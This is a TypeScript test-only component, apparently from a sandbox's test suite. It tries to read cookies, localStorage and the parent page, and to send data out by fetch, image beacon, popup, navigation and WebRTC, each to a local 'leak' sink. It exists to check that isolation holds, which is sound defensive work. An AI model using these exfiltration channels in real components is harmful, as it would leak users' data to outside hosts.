// Test-only component. It tries each way a component could read host data or send what it
// was shown elsewhere, then reports what it saw. Tests trust the exfiltration server's log,
// not this report, for anything that leaves the browser.
export {};

declare const port1: MessagePort; // the bootstrap's channel, in scope because modules are concatenated

const SINK = "http://127.0.0.1:8798";
const report: Record<string, string> = {};

async function attempt(name: string, action: () => Promise<unknown>) {
  try {
    report[name] = `allowed: ${String(await action()).slice(0, 120)}`;
  } catch (error) {
    report[name] = `denied: ${(error instanceof Error ? `${error.name}: ${error.message}` : String(error)).slice(0, 160)}`;
  }
}

const loads = (element: HTMLImageElement | HTMLVideoElement, url: string) =>
  new Promise((resolve, reject) => {
    element.addEventListener(element instanceof HTMLImageElement ? "load" : "loadedmetadata", () => resolve("loaded"));
    element.addEventListener("error", () => reject(new Error("error event")));
    element.src = url;
    setTimeout(() => reject(new Error("no load within 3 s")), 3000);
  });

await attempt("base URL", async () => document.baseURI);
await attempt("fetch host API", async () => (await fetch("/api/items")).status);
await attempt("fetch sink", async () => (await fetch(`${SINK}/fetch?leak=1`)).status);
await attempt("read parent DOM", async () => parent.document.title);
await attempt("read cookies", async () => document.cookie);
await attempt("localStorage", async () => localStorage.length);
await attempt("image beacon", () => loads(new Image(), `${SINK}/img?leak=1`));
await attempt("host media", () => loads(document.createElement("video"), new URL("/api/items/x/original", document.baseURI).href));
await attempt("popup", async () => {
  if (window.open(`${SINK}/popup?leak=1`) === null) throw new Error("window.open returned null");
  return "opened";
});
await attempt("navigate top", async () => {
  top!.location.href = `${SINK}/top?leak=1`;
  return "assigned";
});
await attempt("WebAssembly", () => WebAssembly.compile(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0])));
await attempt("Web Worker", () =>
  new Promise((resolve, reject) => {
    let worker = new Worker("data:text/javascript,postMessage(1)");
    worker.onmessage = () => resolve("ran");
    worker.onerror = () => reject(new Error("error event"));
    setTimeout(() => reject(new Error("no message within 3 s")), 3000);
  }),
);
await attempt("WebRTC to STUN", async () => {
  let connection = new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:3478" }] });
  connection.createDataChannel("leak");
  await connection.setLocalDescription(await connection.createOffer());
  await new Promise((resolve) => setTimeout(resolve, 1500));
  let state = connection.iceGatheringState;
  connection.close();
  return `ice gathering ${state}`;
});
port1.postMessage({ type: "report", report });
// Last, because it replaces this document if it succeeds.
setTimeout(() => {
  location.href = `${SINK}/navigate?leak=1`;
}, 200);
